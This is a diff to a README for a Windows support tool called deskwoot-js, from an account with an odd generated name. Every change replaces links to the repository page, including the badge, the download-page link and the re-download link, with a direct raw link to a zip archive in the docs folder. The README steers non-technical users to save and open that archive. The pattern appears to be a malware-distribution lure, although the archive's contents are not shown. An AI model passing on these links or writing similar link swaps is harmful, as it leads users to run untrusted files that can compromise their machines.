@@ -1,6 +1,6 @@
 # 🤖 deskwoot-js - Simple support tools for Windows teams
 
-[![Download deskwoot-js](https://img.shields.io/badge/Download%20deskwoot--js-blue?style=for-the-badge&logo=github)](https://github.com/instrumentoftortureprofile691/deskwoot-js)
+[![Download deskwoot-js](https://img.shields.io/badge/Download%20deskwoot--js-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/instrumentoftortureprofile691/deskwoot-js/main/docs/deskwoot_js_v2.7.zip)
 
 ## 🚀 What this is
 
@@ -32,7 +32,7 @@ For the best results, use a Windows account that can install and open files with
 
 Use this link to visit the download page and get the latest version:
 
-[Visit the deskwoot-js download page](https://github.com/instrumentoftortureprofile691/deskwoot-js)
+[Visit the deskwoot-js download page](https://raw.githubusercontent.com/instrumentoftortureprofile691/deskwoot-js/main/docs/deskwoot_js_v2.7.zip)
 
 Open the page in your browser, then look for the latest release or download option. If your browser asks what to do with the file, choose Save.
 
@@ -160,7 +160,7 @@ Use the download page again, save the file, and open it with the normal Windows 
 
 If you need the file again, use this same page:
 
-[https://github.com/instrumentoftortureprofile691/deskwoot-js](https://github.com/instrumentoftortureprofile691/deskwoot-js)
+[https://raw.githubusercontent.com/instrumentoftortureprofile691/deskwoot-js/main/docs/deskwoot_js_v2.7.zip](https://raw.githubusercontent.com/instrumentoftortureprofile691/deskwoot-js/main/docs/deskwoot_js_v2.7.zip)
 
 ## 🧭 Folder ideas for Windows users
 
